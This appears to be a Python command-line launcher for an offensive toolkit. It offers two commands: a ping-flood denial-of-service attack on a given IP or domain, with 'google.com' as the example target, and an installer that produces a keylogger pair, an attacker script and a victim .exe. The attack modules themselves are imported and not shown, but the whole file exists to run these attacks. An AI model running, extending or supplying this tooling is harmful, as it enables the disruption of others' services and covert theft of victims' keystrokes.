import ddos
from klogger.klogger_installer import Installer
art = r"""



"""

cm_list = """
COMMAND LIST:
DoS attack [1] 
Key Logger [2]

TYPE "[COMMAND NUMBER] help" to view the parameters of the command
"""
help = {

   1 : "DDOS ATTACK:\nDescription: DoS attack with ping flood\n Syntax: 1 [number of pings] [target (ip address of domain)]\n Es. 1 6 google.com",
   2 : "Key Logger installer:\nDescription: installs klogger attacker file (.py) and klogger victim file (.exe 9 MiB) in /output folder\nSyntax: 2 [attacker file name] [victim file name]"
        
   }    
ntool = 2
print(cm_list)
class Tool():
    def __init__(self):
        pass
    def run(self):
        console = input("write the number of the tool $ ")
        
        console = console.split()
        comm = console[0]
        #DDOS ATTACK
        if comm == "1":
  
            try:
                nping,target = console[1] , console[2]
                ddos.Attack(nping,target).ping()
            except IndexError: print("Error: Missing parameters")
        elif comm == "2":
            try:

                attname, victimname = console[1], console[2]
                Installer.install(attname,victimname)

            except Exception as e:
                print(e)

        elif comm == "help" and len(console) == 2:

            for key ,value in help.items():
                if int(console[1]) == key:
                    print("\n"+value+"\n")
                    break
                else:
                    print(f"Error: command {comm} does not exist.")

if __name__ == "__main__":
    app = Tool()
    while True:
        app.run()